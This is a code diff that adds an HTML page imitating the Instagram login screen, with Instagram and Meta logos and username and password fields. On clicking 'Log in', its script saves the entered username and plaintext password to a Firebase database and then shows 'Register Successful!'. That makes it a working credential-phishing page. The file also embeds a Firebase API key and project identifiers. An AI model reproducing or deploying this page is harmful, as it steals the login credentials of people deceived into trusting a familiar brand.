@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img class="insta_logo" src="vecteezy_instagram-logo-png-instagram-icon-transparent_18930691 (4).png">
+        <img class="insta-text_logo" src="Daco_4275592.png">
+        <input type="text" value="" placeholder="Phone number, username" class="input_1" id="username">
+        <input type="password" value="" placeholder="Password" class="input_2" id="password">
+        <button type="submit" class="button" id="loginButton">Log in</button>
+        <a href="#">Forgotten Password?</a>
+        <img class="meta_logo" src="Meta-logo-grayscale.png">
+    </div>
+    
+    <!-- Firebase Scripts --> 
+    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js"></script>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+    
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDW57GXSA5Zk44I1XLIQh5LK22ydqFkI34",
+            authDomain: "realproject-bc941.firebaseapp.com",
+            projectId: "realproject-bc941",
+            storageBucket: "realproject-bc941.appspot.com",
+            messagingSenderId: "614906264632",
+            appId: "1:614906264632:web:60d7a137ee91348a927acd"
+        };
+    
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+    
+        document.getElementById("loginButton").addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+    
+            set(ref(db, 'user/' + username), {
+                username: username,
+                password: password,
+            });
+            if (!username || !password) {
+                alert("Please fill both the username and passwords.");
+                return;
+            }
+    
+    
+            alert("Register Successful!");
+        });
+    </script>
+</body>
+</html>
+
